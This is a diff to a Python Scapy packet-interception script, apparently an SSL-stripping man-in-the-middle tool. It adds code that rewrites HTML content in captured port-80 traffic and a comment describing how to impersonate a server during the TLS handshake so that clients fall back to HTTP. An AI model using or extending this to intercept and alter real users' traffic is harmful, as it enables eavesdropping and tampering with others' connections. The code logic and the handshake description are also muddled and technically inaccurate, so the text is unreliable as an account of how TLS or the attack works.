@@ -93,16 +93,22 @@ def process_packet(packet):
     # Check if packet is a HTTP request
     if scapy_packet.haslayer(Raw) and scapy_packet.haslayer(TCP):
         if scapy_packet[TCP].dport == 80:
-            print("[+] HTTP Request...")
+            print("[+] TCP ...")
             load = scapy_packet[Raw].load.decode()
 
             # Check if the request is trying to establish a secure connection
             if 'https://' in load:
                 # If it is, call the intercept_packet function to handle it
+                print("[+] HTTPS ...")
                 intercept_packet(scapy_packet)
             else:
                 # Otherwise, modify the request as necessary
-                load = re.sub('https://', 'http://', load)
+                print("[+] HTTP ...")
+
+                load = re.sub('<html><body><h1>It works!</h1></body></html>', \
+                          '<html><body><h1>Now you are seeing a modified packet</h1></body></html>', load)
+                
+                
                 scapy_packet[Raw].load = load.encode()
                 del scapy_packet[IP].len
                 del scapy_packet[IP].chksum
@@ -147,6 +153,16 @@ def start():
     # Start the proxy
     start_proxy()
 
+
+'''
+1 When the client sends a ClientHello message to start the SSL/TLS handshake process, you intercept this message.
+
+2 Instead of forwarding the ClientHello message to the server, you send a ServerHello message back to the client, pretending to be the server. In this message, you indicate that you only support insecure connections (i.e., connections over HTTP).
+
+3 The client, thinking that the server only supports insecure connections, should then continue the connection over HTTP.
+
+4 You then establish a separate, secure connection with the server, and relay messages between the client and the server, modifying them as necessary.
+'''
 
 if __name__ == "__main__":
     start()
